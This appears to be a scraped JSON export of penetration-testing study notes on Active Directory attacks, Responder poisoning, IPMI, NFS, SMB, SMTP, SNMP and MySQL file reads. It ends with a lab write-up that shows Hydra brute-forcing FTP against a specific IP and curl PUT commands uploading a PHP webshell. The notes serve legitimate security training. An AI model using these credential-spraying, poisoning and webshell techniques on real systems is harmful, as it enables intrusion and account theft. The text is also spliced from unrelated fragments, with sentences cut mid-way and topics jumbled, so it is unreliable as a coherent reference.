It is a distributed, hierarchical structure that allows centralized management of an organization's resources, including users, computers, groups, network devices and file , group policies, devices, and trusts. AD provides authentication, authorization and accounting.\nActive Directory is important because Microsoft Active Directory holds around 43% of the market share for enterprise organizations utilizing Identity and Access management solutions,\nThere have also been a huge number of vulnerabilities discovered regarding AD in the past years so the threat is present. We practice enumerating AD with different tools such as Sysinternals, WMI,  DNS, and others. Some attacks will include the usage of tools like Responder, Kerbrute, Bloodhound and more.\nGeneral hold is getting foothold in and Active Directory environment and moving laterally or vertically and escalating privileges until we accomplish intended goal or reach certain position.\nHere we can use our tools but we also need to be comfortable enumerating and attacking AD with limited set of tools or built in Windows tools known as \"living of the land\".","description":"Understand the domain, assessment goals, and lessons from the supplied engagement examples.","contentKey":"a6e0ef27fc244808d6de","legacy":false,"category":"Active Directory","keywords":[],"aliases":[],"guide":false,"reviewed":false,"contentRole":"Inside a note","operationIds":[]},{"id":"section-active-directory/foundations#real-world-examples-important-learn-from-this","title":"Real-World examples (important- learn from this)","href":"/active-directory/foundations#real-world-examples-important-learn-from-this","route":"active-directory/foundations","trail":"Active Directory Foundations and Methodology","kind":"Section","source":"Active Directory/01 Foundations and Methodology.md","subject":"ad","derived":false,"sourceCapture":false,"body":"First example:\nDuring this engagement, I compromised a single host and gained  SYSTEM  level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were  Service Principal Names  (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the  d3ad0ne  rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the  NetNTLMv2 hash  of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.\nSecond example:\nPassword spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the  enum4linux  tool and retrieved both a listing of  all  users from the domain, and the domain  password policy . Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1,  Password1 , Password123,  Spring2018 , etc. but did not get any hits. Finally, I made an attempt with  Spring@18  and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a  pass-the-ticket  attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.\nThird example:\nI had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the  Kerbrute  tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the  linkedin2username  tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the  statistically-likely-usernames  GitHub repo and, after using the  userenum  feature of Kerbrute, ended up with 516 valid users. I knew I had to tread carefully with password spraying, so I tried with the password  Welcome2021  and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool  DomainPasswordSpray  to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had  GenericAll  rights over the  Enterprise Key Admins  group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the  Shadow Credentials  attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.\nSource:  original AD notes , lines 1–26. We want to acquire cleartext credentials for domain account thereby gaining us a foothold in the domain.\nWe will perform man-in-the-middle attack on Linked-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, we may get low-privileged or administrative level password hashes that can also sometimes be used to perform SMB relay attacks.\nLLMNR & NBT-NS Primer\nThey are used if DNS fails for host identification. If DNS fails for some reason then LLMNR is used and it asks all machines on the local network for the correct host address. LLMNR is based upon the Domain Name System (DNS) and allows the hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP. If LLMNR fails then NBT-NS will be used. It identifies systems on a local network by their NetBIOS name. It utilizes port 137 over UDP.\nThe thing is, when LLMNR and NBT-NS are used for name resolution, ANY host on the  network can reply. This is where we come in with the Responder and poison these requests. We can poison the authoritative name resolution source in the broadcast domain by responding to LLMNR nad NBT-NS traffic as if they have the answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending we know about the requested host. If the requested host requires authentication then we capture NetNTLM hash and attempt offline password recovery or relay a live authentication exchange where the protocol permits; the captured NetNTLM response is not an NT hash for pass-the-hash. We can then use it against different protocols such as LDAP.\nExample for LLMNR/NBT-NS poisoning.\nLet's say the host is attempting to connect to \\print1.inlanefreight.local but accidentally types in \\ printer1@inlanefreight.local\nDNS server responds with not knowing this host\nThen host broadcasts request to the entire network asking if anyone knows this host and its location (\\ printer1@inlanefreight.local )\nWe (the attacker with Responder) respond to the host stating that we are the \\ printer1@inlanefreight.local\nThe host believes us and sends a username and a NetNTLMv2 challenge-response to authenticate\nWe then attempt to crack the captured NetNTLMv2 response offline and use it elsewhere.\nSeveral tools can be used for this purpose:\nResponder\nInveigh\nMetasploit\nResponder is written in Python and typically used on a Linux host, while Inveigh is written in C# and PowerShell. Responder also has a .exe version that works on Windows. Both can attack:\nLLMNR\nNBT-NS\nMDNS\nDNS\nDHCP\nICMP\nHTTP\nHTTPS\nSMB\nLDAP\nWebDAV\nProxy Auth\nResponder also has support for:\nPOP3\nMSSQL\nDCE-RPC\nFTP\nIMAP\nSMTP auth\nWe can see Responder options if we type:\nresponder -h\nthere are some interesting options:\nflag -A puts us in Analyze mode so there is no poisoning just NBT-NS, LLMNR, MDNS requests in environment.\nWe must always supply either interface or an ip address.\nWe may typically also commonly use -wf option. -w is for starting WPAD rouge proxy server, and -f is for attempting to fingerprint the  remote host.\nwe can use -v for increased verbosity\nalso we can use -F or -P to force NTLM/Basic or proxy authentication but it may cause a login prompt.\n-w flag utilizes the built-in WPAD proxy server and this can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.\nWith this configuration shown above, Responder will listen and answer any requests it sees on the wire. If you are successful and manage to capture a hash, Responder will print it out on screen and write it to a log file per host located in the  /usr/share/responder/logs  directory. Hashes are saved in the format  (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt , and one hash is printed to the console and stored in its associated log file unless  -v  mode is enabled. For example, a log file may look like  SMB-NTLMv2-SSP-172.16.5.25 . Hashes are also stored in a SQLite database that can be configured in the  Responder.conf  config file, typically located in  /usr/share/responder  unless we clone the Responder repo directly from GitHub.\nwe must run responder with sudo.\nOn the windows we can run Inveigh\nIt is a tool written in PowerShell and C#. A secondary keeps its copy of the zone in sync using the  SOA (Start of Authority)  record's serial number and timers:\nSOA field | Purpose\nSerial | Version number of the zone. The secondary compares it to its own to decide whether a transfer is needed.\nRefresh | How often the secondary polls the primary to check the serial.\nRetry | How long to wait after a failed refresh before retrying.\nExpire | How long the secondary keeps serving the zone if it can't reach the primary.\nNegative TTL | How long  NXDOMAIN  (non-existent name) answers are cached.\nTwo things trigger a refresh:\nPolling  — the secondary checks the primary's serial on a timer (the SOA  Refresh  interval).\nNOTIFY  (RFC 1996) — the primary  pushes  a \"zone changed\" message so secondaries pull immediately instead of waiting for the timer.\nWhen a transfer happens, the secondary requests one of two types:\nAXFR  (RFC 5936) — a  full  transfer of every record. This connection stays open for the whole session.\nThe  data connection  carries the actual file contents and directory listings on a  different  port, opened fresh for each transfer.\nHow that second connection gets established is the difference between the two FTP modes, and it's the thing that confuses people:\nActive mode  — the  server  opens the data connection back to the client. The client says \"connect to me on port X,\" and the server initiates from its port 20. This breaks through client-side firewalls/NAT (the server connecting inward is usually blocked), which is why it's largely obsolete.\nPassive mode (PASV)  — the  client  opens both connections. The server says \"connect to me on port Y,\" and the client initiates. This is firewall-friendly and the default today.\nWhy this matters practically\nIf transfers hang after login \"succeeds,\" it's almost always an active/passive mismatch or a firewall blocking the data channel. Most CLI clients let you toggle with  passive  once connected. You rarely need to think about it, but knowing it explains the failure mode.\nFTP is plaintext\nCredentials and file contents travel  unencrypted . Anyone sniffing the network sees the  USER / PASS  exchange in the clear. It runs continuously as long as the machine has standby power — so it answers on the network even when the host OS is shut down. Admins use it for out-of-band management: powering the machine on/off, watching the boot screen, mounting virtual media to reinstall the OS, and getting a remote console (virtual KVM / Serial-over-LAN) without standing in the datacenter.\nThat capability is exactly why it's such a high-value target. If you control the BMC you can:\nPower cycle or hard-reset the host at will.\nWatch and interact with the live console as if you were sitting at the keyboard.\nMount an ISO and  reinstall or boot a different OS , bypassing every control inside the running OS.\nIn other words, BMC access ≈ physical access. Disk encryption and OS-level hardening don't help much against someone who can reboot the box into their own media.\nIPMI talks over  UDP port 623 , and most BMCs also expose a  web console on 443  branded with the vendor name. Because 623 is UDP, a default TCP-only scan misses it entirely — you must scan UDP.\nHow to spot it on a scan\nUDP 623 open  (use  -sU ; TCP-only scans miss it).\nA web login on  443  branded  iLO ,  iDRAC , or  Supermicro .\nNmap's  ipmi-version  script returns a version —  2.0 is the exploitable one .\nsudo nmap -sU --script ipmi-version -p 623 <TARGET-IP>","description":"A BMC is a separate microcontroller with its own CPU, memory, firmware, and network connection, soldered onto the server's motherboard. IPMI 2.0 authenticates using the  RAKP (Remote Authenticated Key-Exchange Protocol) . During the handshake, before the client has proven who it is, the BMC sends back a  salted hash of the requested user's password  as part of the key-exchange messages. This is by design in the spec — and it's a fatal flaw.\nThe practical consequence: you can ask the BMC for the hash of  any valid username  (e.g.  admin ,  Administrator ,  root )  without authenticating at all , capture the salted SHA1/MD5 hash, and crack it offline at your leisure. There's no lockout, no logging of a failed login, because as far as the BMC is concerned no login was ever attempted.\nWhy this matters\nUnlike normal online brute-forcing, you're cracking  offline  — unlimited guesses, no lockout. Historically NFS relied on  rpcbind / portmapper  on TCP/UDP  111  plus  mountd  to negotiate which port the actual NFS service used. Modern NFSv4 consolidates everything onto  2049 , but you'll still see 111 on older setups, and it's what  rpcinfo  queries.\nIdentity is just numeric UID/GID.  This is the crucial concept. NFS (v3 especially) doesn't authenticate  users  — it trusts whatever  UID/GID  the client claims. If a file on the server is owned by UID 1000, then  your  local user with UID 1000 can read/write it, regardless of who that user actually is. There's no password exchange; the server assumes the client has already authenticated its own users.\nWhy \"identity = UID number\" is the whole vulnerability\nBecause the server trusts the client's UID, you control the UID on  your  box. If you know a file is owned by UID 1005, you create a local user with  useradd -u 1005  (or just  sudo , which runs as UID 0), mount the share, and you now have that user's access to the files. A client (your box, or another Windows machine) connects to a server's TCP  445  and asks to use a  share  — a named, exported folder or resource like  \\\\SERVER\\Finance  or the hidden admin share  \\\\SERVER\\C$ . Everything in SMB hangs off this idea of connecting to a named share and then reading/writing files or calling management functions through it.\nA few concepts you need so the rest makes sense:\nShares.  A server publishes one or more shares. Some are user-created ( Finance ,  IT ,  devshare ); some are built-in administrative shares ending in  $  ( C$  = the whole C: drive,  ADMIN$  = the Windows folder,  IPC$  = the inter-process communication share). The  $  just means \"hidden from casual browsing\" — it does  not  mean protected.\nIPC$ and named pipes.   IPC$  is a special share that doesn't hold files; it's the channel used for  remote management calls  (the same MS-RPC functions  rpcclient  uses to list users, groups, and the password policy). This is why connecting to  IPC$  with no credentials — a  null session  — can leak so much.\nPorts 139 vs 445.  Modern SMB runs  directly over TCP 445 . The older  139  ran SMB over NetBIOS; you'll still see it on legacy systems. Either open port means SMB is in play.\nDialects (versions).  SMBv1 is ancient and dangerous (it's the version EternalBlue/MS17-010 exploited). SMBv2/v3 are current; v3 adds encryption. The dialect a server still accepts is itself a finding.\nWhy SMB is such a high-value target\nThree different wins live behind the same port: (1)  file shares  routinely contain plaintext credentials, configs, private keys, and backups; (2) the  IPC$ / RPC  channel leaks the user list, groups, and password policy you need to spray credentials; and (3) with admin-level credentials, SMB is a direct path to  remote code execution  (PsExec-style). A normal message looks like this:\nHELO attacker.com            # (or EHLO) introduce yourself; EHLO lists server capabilities\nMAIL FROM:<sender@x.com>     # who the mail is from (the \"envelope sender\")\nRCPT TO:<victim@target.com>  # who it's going to (the server checks if this mailbox exists)\nDATA                         # begin the message body\nSubject: hi\n...message...\n.                            # a single dot on its own line ends the message\nQUIT\nTwo design facts drive everything we do with it:\nThe server validates recipients.  When you send  RCPT TO:<user> , the server has to decide whether that mailbox exists — and it answers  differently  for real vs fake addresses. That difference leaks the user list.\nSMTP was built to relay.  A mail server's whole job is to accept a message and forward it onward. Whether it  should  relay a given message depends on configuration — and a server that relays for  anyone  is an  open relay .\nWhy SMTP is useful even without credentials\nYou don't need to log in to talk to port 25. The recipient-validation behavior means you can confirm which usernames exist  pre-authentication , and an open relay lets you send mail  pre-authentication . When you enumerate it manually ( telnet <IP> 25 , then  HELO ,  VRFY ,  EXPN ,  RCPT TO ), the server replies with these  3-digit status codes . This sheet decodes them so you know whether a command worked, a user exists, or relay is allowed. (To  read  mail, see  Email Enumeration & Manipulation (POP3 - IMAP) .)\nHow to spot SMTP + what the codes tell you\nOpen  TCP 25  with an  nmap -sV  banner like  Postfix / Exchange / Sendmail . Script:  smtp-commands ,  smtp-enum-users .\nDuring user enumeration:  250 / 252  after  VRFY <user>  often = the user  exists ;  550  = no such user.  251  = will relay. The  manager  is the monitoring station (e.g. a NOC server running something like PRTG or Nagios). The  agent  is a small service running on each managed device that exposes that device's internal state. The manager polls agents; agents answer. Devices can also push unsolicited alerts (called  traps ) back to the manager when something happens.\nThere are only three operations you really need to understand:\nGET  — the manager asks the agent for the value of something (\"what processes are running?\", \"what's your hostname?\"). This is what we abuse to enumerate.\nSET  — the manager  changes  a value on the device (reconfigure an interface, reboot, etc.). If we get write access, this becomes a foothold.\nTRAP  — the agent pushes an alert to the manager unprompted. Less relevant to us offensively, but it's why you'll also see UDP 162.\nThe reason SNMP is so dangerous is that the agent will happily answer GET requests from  anyone  who knows the  community string  — and that string is the only thing standing between an attacker and the device's entire internal inventory.\nThe core weakness: community strings are cleartext \"passwords\"\nIn  SNMP v1 and v2c  (by far the most common in the wild) the community string is sent  in plaintext over UDP  with every request — no hashing, no encryption, no challenge-response. So if you can guess or sniff it, you have full access at that string's privilege level. Worse, the defaults are almost never changed:\npublic  →  read-only  access (read the entire device state)\nprivate  →  read/write  access (read  and  reconfigure the device via SET)\nSNMP v3  fixed this by adding real usernames, authentication (HMAC), and encryption — but you'll still find v1/v2c everywhere, especially on printers, IoT, and forgotten appliances.","description":"SNMP is built on a simple manager ↔ agent model. Think of it as a hierarchical tree: each dot drills one level deeper, so  1.3.6.1.2.1.25.4.2.1.2  is the specific branch that holds  running process names .\nThose raw numbers are unreadable, so each OID maps to a human name defined in a  MIB (Management Information Base)  — a dictionary file that translates  1.3.6.1.2.1.25.4.2.1.2  into something like  hrSWRunName . The MIB is just the lookup table; the OID is the actual address. You don't need to memorise OIDs — tools resolve them for you — but understanding the tree is  why  \"walking\" works: you can start at the top and have the agent dump every branch beneath it.\nHow to spot it on a scan\nSNMP runs on  UDP port 161  (management) and  UDP 162  (traps). Remote Access: RDP, WinRM, and WMI","kind":"Section","source":"Enumeration/Windows Remote Management Protocols Cheat Sheet.md","subject":"recon","derived":false,"sourceCapture":false,"body":"Windows offers several ways for admins to manage a machine over the network. As attackers, these are the doors we walk through  once we have valid credentials  — they turn a username/password (or a hash) into an interactive shell or remote command execution. The three to know are  RDP  (graphical desktop),  WinRM  (PowerShell remoting), and  WMI  (management + command execution over RPC).\nThe key idea: credentials → access\nThese protocols don't usually hand you a foothold by themselves — they're how you  use  credentials you've already found. So the workflow is always: get creds (crack, spray, hunt) → try them against RDP/WinRM/WMI → see which the account is allowed to use. Different services require membership in different groups, so a cred that fails on one may work on another.\nSame creds, different doors\nA user might be blocked from WinRM (needs \"Remote Management Users\") but allowed on RDP (needs \"Remote Desktop Users\"). The full stabilization below turns it into a near-native terminal. It matters because half-broken shells get you killed mid-engagement — you fat-finger  Ctrl-C , lose the session, and have to re-exploit.\nThe reason this works: the raw netcat session has no real PTY, so the local and remote terminals disagree about who handles line editing and signals. You spawn a PTY remotely, then reconfigure your  local  terminal to pass keystrokes through raw (so the remote PTY handles them), and finally tell the remote shell your real terminal size and type.\n# 1. On the TARGET shell — spawn a proper PTY\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# 2. Background the shell: press Ctrl-Z (drops you back to your LOCAL terminal)\n\n# 3. On YOUR box — set the local terminal to raw and re-foreground the shell\nstty raw -echo; fg\n#   stty raw -echo = stop the local terminal from intercepting keys/signals\n#   fg             = bring the backgrounded remote shell back (press Enter once or twice)\n\n# 4. Back on the TARGET — declare your terminal type and size so editors/clear work\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 38 columns 116        # use your real size — check with `stty size` locally first\nAfter this you have working arrow keys, history, tab-completion,  Ctrl-C  that only kills the foreground command, and full-screen programs (vim, less) that render correctly.\nIf you ever exit and your local terminal is broken (no echo, garbled)\nYour  stty raw -echo  is still in effect locally. directory (e.g., C:\\xampp\\mysql\\ on a XAMPP install). Since you always know this value with certainty once connected, it functions as a confirmed anchor point — a real, verified path you can build guesses or traversal off of, rather than blindly guessing an entire absolute path from nothing.\nThe same two prerequisite checks from Phase 3 apply here (FILE privilege, secure_file_priv), plus one extra wrinkle specific to reads: the target file also has to be OS-readable by whichever account the MySQL/MariaDB service itself runs as — not the database user you're logged in as. If the service account can't read the file (say, it's ACL'd to Administrator only), LOAD_FILE just silently returns NULL, even with correct SQL-level privileges and no secure_file_priv restriction blocking the path.\nGeneral methodology for blind file discovery, when you have a file-read primitive but don't know the layout: fingerprint the OS and version first (SELECT @@version_compile_os;, SELECT @@version;), since that narrows down which default paths are worth trying.\nLean on well-known default install locations — C:\\xampp, C:\\wamp64\\www, C:\\inetpub\\wwwroot\\ on Windows; /var/www/html/, /etc/ on Linux.\nUse a small, guaranteed-to-exist file as an initial probe to confirm read access works at all before worrying about anything specific — C:\\Windows\\win.ini on Windows, /etc/passwd on Linux, are both classic choices.\nRemember that LOAD_FILE() cannot list directory contents — it can only read an exact filename you already have — so for user-specific paths like C:\\Users&lt;name>\\Desktop, the username has to come from somewhere else entirely (SMB enumeration, RID cycling, earlier recon, or just trying very common defaults like Administrator).\nAnd prefer combining multiple recon channels over pure blind guessing — verbose error messages, stack traces, exposed .git directories, and misconfigured directory listings frequently leak full server paths for free.\nFinally: the moment actual command execution is available, this entire blind-guessing approach becomes unnecessary — direct directory listing (dir / Get-ChildItem) is strictly faster and more reliable than reading one guessed file at a time through SQL.","description":"Since command execution was already achieved by this point, this wasn't actually needed to solve the box — but A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).\nWhen we press the Send button in our email application (email client), the program establishes a connection to an SMTP server on the network or Internet. The name SMTP stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.\nWhen we download emails to our email application, it will connect to a POP3 or IMAP4 server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.\nBy default, POP3 clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a POP3 client to keep copies of downloaded messages on the server.\nOn the other hand, by default, IMAP4 clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let's see how we can target mail servers.\nDiagram of email flow: 1. Email sent from a computer via SMTP to a server. 2. Server forwards email via SMTP to another server. 3. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. If we use a ticket intended for a particular region, we will be able to use the bus, and otherwise, we will not. These privileges (or figuratively speaking, our tickets) can also be used for different means of transport, such as planes, trains, boats, and others. In computer systems, these privileges serve as control and segmentation of actions for which different permissions, controlled by the system, are needed. Therefore, the rights are checked based on this categorization when a process needs to fulfill its task. If the process satisfies these privileges and conditions, the system approves the action requested. We can divide these privileges into the following areas:\nPrivileges | Description\nSystem | These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called SYSTEM, and in Linux, it is called root.\nUser | User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.\nGroups | Groups are a categorization of at least one user who has certain permissions to perform specific actions.\nPolicies | Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.\nRules | Rules are the permissions to perform actions handled from within the applications themselves.\nLog4j\nWhat made the Log4j vulnerability so dangerous was the Privileges that the implementation brought. Therefore, logs are usually stored in locations that no regular user should be able to access. Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary. The result of such a task is either stored somewhere or forwarded to another processing point. Therefore we speak here of the Destination where the changes will be made. Such processing points can point either to a local or remote process. Therefore, at the local level, local files or records may be modified by the process or be forwarded to other local services for further use. However, this does not exclude the possibility that the same process could reuse the resulting data too. If the process is completed with the data storage or its forwarding, the cycle leading to the task's completion is closed.\nDestination | Description\nLocal | The local area is the system's environment in which the process occurred. Therefore, the results and outcomes of a task are either processed further by a process that includes changes to data sets or storage of the data.\nNetwork | The network area is mainly a matter of forwarding the results of a process to a remote interface. This can be an IP address and its services or even entire networks. The results of such processes can also influence the route under certain circumstances.\nLog4j\nThe misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the Destination in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (RCE) vulnerability.\nGovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail.\nDiagram of Log4j JNDI attack flow from attacker to vulnerable server and malicious LDAP server, with prevention steps like blocking WAF, disabling JNDI lookups, and patching Log4j. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port 139 and UDP ports 137 and 138. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port 445 without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.\nSamba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.\nFor instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.\nAnother protocol that is commonly related to SMB is MSRPC (Microsoft Remote Procedure Call). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in MS-RPCE, which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.\nTo attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. The Windows Sysinternals website was created in 1996 by Mark Russinovich and Bryce Cogswell to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.\nSysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the Microsoft website. One of those freeware tools to administer remote systems is PsExec.\nPsExec is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. On Windows machines, the procedure will roughly be as follows:\nThe hostname file share's IP address is required.\nThe local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.\nIf no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.\nIs there no local DNS record? This is a problem because no measures are taken to verify the integrity of the responses. We can use the rpclient man page or SMB Access from Linux Cheat Sheet from the SANS Institute to explore this further.\nPersonal note — the Samba \"Guest\" trap\nWhy You Needed --local-auth (The Samba \"Guest\" Trap)\nWhen you ran your initial password audit against the target, NetExec's output dropped a massive clue: [+] \\admin:liverpool (Guest) along with Null Auth:True.\nHere is exactly what was happening behind the scenes:\nThe Default Behavior: The target machine is a Linux server running Samba. Samba has a built-in fallback feature: if a user tries to log in with credentials that the system doesn't validate as a real, privileged user account, it doesn't always throw an error. Instead, it says, \"Sure, come on in, but I'm dropping you into a restricted Guest session.\"\nThe Tool's Misinterpretation: Because the SMB server responded with a successful connection status (even though it was just a Guest token), NetExec assumed the username and password combination was valid. It effectively masked the true authentication failures.\nWhat --local-auth Does: By appending --local-auth, you explicitly instruct NetExec to bypass domain-level fallbacks and force the target to authenticate the credentials against its local SAM database (or /etc/samba/smbpasswd on Linux). To get the password, a brute-force attack was run directly against the FTP service (port 21) using Hydra paired with rockyou.txt — the classic leaked-password wordlist (originally from the 2009 RockYou breach) that ships by default with Kali Linux.On Kali, rockyou.txt ships gzip-compressed to save disk space and normally needs to be extracted once before first use:sudo gunzip /usr/share/wordlists/rockyou.txt.gzThen the brute-force itself, testing every password in the list against the known username over FTP:hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.78.187-l fiona fixes the username, -P <wordlist> feeds Hydra the password list to iterate through, and ftp://<target> tells Hydra which protocol module to use — Hydra has protocol-specific modules (ftp, ssh, http-get, mysql, smb, etc.) and picks behavior accordingly. This eventually produced a hit: fiona:987654321. Those credentials turned out to be valid not just for FTP but also for CoreFTP's HTTP(S) interface and for the MariaDB service itself — a common pattern on these boxes, where a single service account's credentials are reused across multiple exposed services.Lesson for the notebook: always check whether credentials found for one service (FTP here) work against other exposed services on the same box (HTTP Basic Auth, database logins, SMB, etc.) before assuming you need to crack each one separately. Credential reuse across services is extremely common and saves a lot of time.Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) ServiceWith fiona:987654321 in hand, the next step was probing what CoreFTP's web-facing interface actually allowed. CoreFTP exposes an HTTP(S) service that, in vulnerable configurations, accepts PUT requests and writes the request body straight to disk as a file. Proof of concept:curl -k -X PUT -H \"Host: $target\" --basic -u fiona:987654321 --data-binary \"PoC.\" --path-as-is https://$target/docs.txtBreaking this down: -k ignores the self-signed TLS certificate (CoreFTP's HTTPS service isn't using a CA-trusted cert), -X PUT sets the HTTP method to PUT instead of the default GET, -H \"Host: $target\" sets the Host header explicitly, --basic -u fiona:987654321 sends HTTP Basic Authentication with the cracked credentials, --data-binary \"PoC.\" sends the literal string PoC. as the request body, and --path-as-is stops curl from \"cleaning up\" the URL path (important once you start trying path traversal or unusual paths — curl by default will collapse things like ../ unless told not to).Verifying the write landed, by requesting the same file back with a normal GET:curl -k -H \"Host: $target\" --basic -u fiona:987654321 https://$target/docs.txtThis returned PoC. — confirming the server had written our request body to disk and would serve it back on request. Arbitrary file write, confirmed.Critical detail that becomes important later: the response headers on the PUT request included:Server: Core FTP HTTP Server\nContent-type: application/octet-streamThis tells you exactly which server handled the request — CoreFTP's own built-in HTTP server, not Apache/XAMPP. That's a completely separate service from the actual web application stack, even though both are reachable over HTTP(S) on the same box. This distinction is the root cause of a mistake that got made twice later in the session.Mistake #1 — Assuming a Successful PUT Upload Equals Code ExecutionWith file-write access confirmed, the natural next move was uploading an actual PHP webshell the same way:curl -k -X PUT -H \"Host: $target\" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://$target/shell.phpThis succeeded — HTTP/1.1 200 Ok, 5490 bytes written — and it felt like a working exploit chain at that point. But it wasn't. The problem is exactly the detail flagged above: this PUT request goes to CoreFTP's own HTTP server, which just writes and serves raw bytes. It has no PHP interpreter behind it at all. So requesting shell.php back from that server would just return (or, from a browser, download) the literal PHP source code as a static file — it would never actually run. A .php extension means nothing to a server that isn't specifically configured to hand .php requests off to a PHP interpreter.The lesson: a successful file write is not the same thing as code execution. You have to confirm the file lands somewhere a script interpreter is actually watching — in this case, Apache's document root — not just anywhere on disk that happens to be reachable over HTTP. This exact mistake got repeated later in the session with a second webshell (see Mistake #3 below), which is what finally made the pattern fully click.Mistake #2 — Local curl Error Misread as a Server-Side ProblemA later attempt at the same kind of upload produced this:curl -k -X PUT -H \"Host:  http://10.129.78.187 \" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is  https://10.129.78.187/shell.php\ncurl: Failed to open shell.php\ncurl: option --data-binary: error encountered when reading a fileAt first glance this looks like it could be an auth issue, a TLS issue, or a server-side rejection. It's none of those — it's a purely local filesystem error. The @ prefix in --data-binary @shell.php is special curl syntax meaning \"read the request body from this local file\" (as opposed to a literal string, which is what the earlier \"PoC.\" example used). Curl tried to open a file called shell.php in the current working directory — which, based on the shell prompt (~), was the home directory — and it wasn't there. Nothing about the target, the network, or the credentials was involved in this failure at all.This became clear by comparing it against a command that did work:curl -k -H \"Host:  http://10.129.78.187 \" --basic -u 